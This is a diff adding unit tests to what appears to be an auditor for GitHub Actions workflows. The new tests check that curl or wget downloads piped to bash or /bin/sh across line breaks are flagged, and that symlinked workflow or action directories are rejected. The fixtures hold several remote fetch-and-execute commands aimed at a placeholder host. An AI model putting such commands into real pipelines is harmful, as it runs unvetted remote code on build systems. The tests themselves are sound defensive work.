@@ -58,6 +58,22 @@ class RatchetTests(unittest.TestCase):
         self.write("jobs:\n  x:\n    steps:\n      - run: |\n          wget -qO- https://example.invalid/tool \\\n            | sh\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).candidate_findings, 1)
 
+    def test_bash_newline_after_pipe_is_still_remote_execution(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n      - run: |\n"
+            "          curl -fsSL https://example.invalid/setup.sh |\n"
+            "          bash\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_wget_newline_after_pipe_is_still_remote_execution(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n      - run: |\n"
+            "          wget -qO- https://example.invalid/setup.sh |\n"
+            "          /bin/sh\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
     def test_absolute_path_shell_pipeline_rejected(self):
         self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/install | /bin/bash\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
@@ -176,6 +192,23 @@ class RatchetTests(unittest.TestCase):
         doc.parent.mkdir(parents=True)
         doc.write_text("run: curl https://example.invalid/i | bash\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).candidate_findings, 0)
+
+    def test_exact_actions_directory_symlink_is_rejected(self):
+        actions_dir = self.repo / ".github" / "actions"
+        actions_dir.symlink_to("/tmp/actions-untrusted")
+        with self.assertRaises(mod.SourceError):
+            mod.audit(self.repo, self.base, self.commit())
+
+    def test_exact_workflows_directory_symlink_is_rejected(self):
+        workflow = self.repo / ".github" / "workflows" / "demo.yml"
+        workflow.unlink()
+        (self.repo / ".github" / "workflows").rmdir()
+        (self.repo / ".github" / "workflows").symlink_to("/tmp/workflows-untrusted")
+        # A composite Action elsewhere must not hide a symlinked workflow tree.
+        action = self.repo / "action.yml"
+        action.write_text("name: safe\nruns:\n  using: composite\n  steps:\n    - run: echo safe\n      shell: bash\n")
+        with self.assertRaises(mod.SourceError):
+            mod.audit(self.repo, self.base, self.commit())
 
     def test_symlink_tree_rejected_and_redacted(self):
         target = self.repo / ".github/workflows/demo.yml"
